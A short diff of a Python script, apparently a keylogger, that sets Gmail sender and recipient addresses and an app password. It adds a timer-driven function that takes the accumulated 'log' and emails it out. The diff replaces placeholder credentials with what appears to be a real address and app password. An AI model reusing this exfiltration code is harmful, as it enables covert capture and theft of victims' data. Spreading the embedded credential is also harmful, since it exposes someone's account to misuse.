@@ -19,12 +19,13 @@ from email.mime.text import MIMEText
 from threading import Timer
 
 #config email
-EMAIL_ORIGEM = "email@email.com" ----> E-mail 1, deve conter autentificação de 2 fatores para poder gerar a senha pelo site "https://myaccounts.google.com/apppasswords"
-EMAIL_DESTINO = "email@email.com" -----> E-mail 2, que também pode ser o 1, mas também pode ser um E-mail diferente
-SENHA_EMAIL = "abcd efgh ijkl mnop"
+EMAIL_ORIGEM = "flohrtestes@gmail.com"
+EMAIL_DESTINO = "flohrtestes@gmail.com"
+SENHA_EMAIL = "cyls cjxq olcj xlgw"
 
 log = ""
 
+# Função que reune dados e envia por email
 def enviar_email():
     global log
     if log:
